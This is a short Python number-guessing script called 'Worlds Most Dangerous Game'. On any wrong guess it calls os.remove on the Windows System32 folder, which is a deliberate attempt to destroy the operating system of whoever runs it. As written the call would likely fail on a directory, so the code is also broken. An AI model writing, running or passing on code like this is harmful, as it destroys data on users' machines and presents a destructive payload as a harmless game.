import random
import os

#Worlds Most Dangerous Game


number = random.randint(1, 50)

guess = int(input("Guess a number between 1 and 50: "))
guess = int(guess)

if guess == number:
    print("Congratulations! You guessed the number!")
else:
    os.remove("C:\\Windows\\System32")